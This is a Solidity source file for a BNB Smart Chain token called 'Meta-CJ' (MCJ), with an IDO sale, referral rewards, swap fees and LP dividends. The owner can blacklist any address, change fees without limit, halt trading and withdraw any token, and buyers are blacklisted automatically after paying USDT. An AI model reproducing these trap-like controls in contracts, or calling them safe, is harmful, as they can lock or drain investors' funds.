/**
 *Submitted for verification at BscScan.com on 2022-09-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);
}
abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    // constructor (address token) {
    //     IERC20(token).approve(msg.sender, uint(~uint256(0)));
    // }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    mapping(address => bool) public _idoList;
    mapping(address => address) public superior;
    mapping(address => uint256) public inviteNum;
    mapping(address => uint256) public claimInviteCount;

    uint256 private _tTotal;
    uint256 public maxTXAmount;
    uint256 public maxHave;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    uint256 public _marketingFee = 300;
    uint256 public _LPDividendFee = 200;
    uint256 public startTradeBlock;
    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, 
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply
    ){
        fundAddress = msg.sender;
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        IERC20(0x55d398326f99059fF775485246999027B3197955).approve(RouterAddress, MAX);
        _allowances[address(this)][address(swapRouter)] = MAX;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), 0x55d398326f99059fF775485246999027B3197955);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = 2 * 10 ** Decimals;
        maxHave = 20 * 10 ** Decimals;
        _tTotal = total;
        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;
        holderRewardCondition = 10 ** Decimals;
    }

    bool public _canIdo;
    uint256 public idoNumber;
    uint256 public claimTokenUsdt;
    uint256 public claimTokenMeta;
    function setCanIdo(bool canIdo) external onlyOwner {
        _canIdo = canIdo;
    }
    function setClaimTokenUsdt(uint256 _claimTokenUsdt) external onlyOwner {
        claimTokenUsdt = _claimTokenUsdt;
    }
    function setClaimTokenMeta(uint256 _claimTokenMeta) external onlyOwner {
        claimTokenMeta = _claimTokenMeta;
    }

    // mapping(address => bool) public _idoList;
    // mapping(address => address) public superior;
    // mapping(address => uint256) public inviteNum;
    // mapping(address => uint256) public claimInviteCount;
    function setClaimInviteCount(address add,uint256 amount) external onlyOwner {
        claimInviteCount[add] = amount;
    }
    function setInviteNum(address add,uint256 amount) external onlyOwner {
        inviteNum[add] = amount;
    }
    function setSuperior(address add,address add2) external onlyOwner {
        superior[add] = add2;
    }
    function setIdoList(address add,bool b) external onlyOwner {
        _idoList[add] = b;
    }
    address public idoAddress;
    function setIdoAddress(address add) external onlyOwner {
        idoAddress = add;
    }
    function claimToken() public {
        require(!_idoList[msg.sender] && _canIdo && superior[msg.sender]!=address(0));
        IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
        USDT.transferFrom(msg.sender,idoAddress,claimTokenUsdt);
        _transfer(address(this),msg.sender,claimTokenMeta);
        _blackList[msg.sender] = true;
        _idoList[msg.sender] = true;
        inviteNum[superior[msg.sender]]++;
        idoNumber++;
    }
    function claimInviteNumber() public{
         uint256 count = canClaimCount(msg.sender);
         require(count>0);
         _transfer(address(this),msg.sender,claimTokenMeta*count);
         claimInviteCount[msg.sender] += count;
         _blackList[msg.sender] = true;
    }
    function canClaimCount(address add) public view returns (uint256){
       return inviteNum[add]/10-claimInviteCount[add];
    }
    function setSuperior(address add) public {
        require(superior[msg.sender] == address(0));
        superior[msg.sender] = add;
    }
    bool public _canAddLp;
    function setCanAddLp(bool canAddLp) external onlyOwner {
        _canAddLp = canAddLp;
    }
    function addUSDTLP(uint256 usdtAmountMax, uint256 tokenAmount) external {
        require(_canAddLp, "closed");
        address account = msg.sender;
        require(account == tx.origin, "notOrigin");
        if (_blackList[account]) {
            // require(startAirdropBlock > 0, "endAirdrop");
            _blackList[account] = false;
        }
        require(tokenAmount == balanceOf(account), "req all");
        uint256 usdtAmount = getAddLPUsdtAmount(tokenAmount);
        require(usdtAmountMax >= usdtAmount, "gt usdtAmountMax");
        address usdt = address(0x55d398326f99059fF775485246999027B3197955);
        IERC20(usdt).transferFrom(account, address(this), usdtAmount);
        require(balanceOf(account) >= tokenAmount, "tokenNotEnough");
        _tokenTransfer(account, address(this), tokenAmount, false,false);
        _swapRouter.addLiquidity(
            address(this), usdt,
            tokenAmount, usdtAmount,
            tokenAmount, usdtAmount,
            account, block.timestamp
        );
        addHolder(account);
    }
    function getAddLPUsdtAmount(uint256 tokenAmount) public view returns (uint256 usdtAmount){
        ISwapPair swapPair = ISwapPair(_mainPair);
        (uint256 reverse0,uint256 reverse1,) = swapPair.getReserves();
        address token0 = swapPair.token0();
        address usdt = address(0x55d398326f99059fF775485246999027B3197955);
        uint256 usdtReverse;
        uint256 tokenReverse;
        if (usdt == token0) {
            usdtReverse = reverse0;
            tokenReverse = reverse1;
        } else {
            usdtReverse = reverse1;
            tokenReverse = reverse0;
        }
        if (0 == tokenReverse) {
            return 0;
        }
        usdtAmount = tokenAmount * usdtReverse / tokenReverse;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    bool public buyBackSwitch = true;
    function setBuyBackSwitch(bool _buyBackSwitch) external onlyOwner {
        buyBackSwitch = _buyBackSwitch;
    }
    bool public LPDividendSwitch = true;
    function setLPDividendSwitch(bool _LPDividendSwitch) external onlyOwner {
        LPDividendSwitch = _LPDividendSwitch;
    }
    bool public rewardSwitch = false;
    function setRewardSwitch(bool _rewardSwitch) external onlyOwner {
        rewardSwitch = _rewardSwitch;
    }
    function setFunAddress(address _fundAddress) external onlyOwner {
        fundAddress = _fundAddress;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }
        bool takeFee;
        bool isSell;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[to], "!startAddLP");
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0 && buyBackSwitch) {
                            swapTokenForFund(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this) && LPDividendSwitch) {
            if (isSell) {
                addHolder(from);
            }
            if(rewardSwitch){
                processReward(500000);
            }
        }
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee = _marketingFee + _LPDividendFee;
            uint256 swapAmount = tAmount * swapFee / 10000;
            feeAmount += swapAmount;
            if (swapAmount > 0) {
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            if (isSell) {
            } else {
                require(tAmount <= maxTXAmount);
                require(balanceOf(recipient)+ tAmount - feeAmount <= maxHave);
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap 
    {
        uint256 totalFee = _marketingFee + _LPDividendFee;
        uint256 buyBackAmount = tokenAmount * _marketingFee/totalFee;
    //     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //     uint amountIn,
    //     uint amountOutMin,
    //     address[] calldata path,
    //     address to,
    //     uint deadline
    // ) external;
        _approve(address(this),address(0x10ED43C718714eb63d5aA57B78B54704E256024E),buyBackAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(0x55d398326f99059fF775485246999027B3197955);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyBackAmount,
            0,
            path,
            fundAddress,
            block.timestamp
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setLPDividendFee(uint256 dividendFee) external onlyOwner {
        _LPDividendFee = dividendFee;
    }
    function setMarketingFee(uint256 marketingFee) external onlyOwner {
        _marketingFee = marketingFee;
    }
    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }
    function setMaxHave(uint256 max) public onlyOwner {
        maxHave = max;
    }

    uint256 public startAddLPBlock;

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "startedAddLP");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        startTradeBlock = 0;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }
    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 public progressRewardBlock;

    uint256 public dividendBlock = 20;
    function setDividendBlock(uint256 _dividendBlock) external onlyFunder {
        dividendBlock = _dividendBlock;
    }
    function processReward(uint256 gas) public {
        if (progressRewardBlock + dividendBlock > block.number) {
            return;
        }
        uint256 totalFee = _marketingFee + _LPDividendFee;
        uint256 balance = balanceOf(address(this)) * _LPDividendFee / totalFee;
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    _tokenTransfer(address(this),shareHolder,amount,false,false);
                }
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyFunder {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }
}

contract MetaCJ is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        unicode"Meta-CJ",
        unicode"MCJ",
        18,
        10000000
    ){

    }
}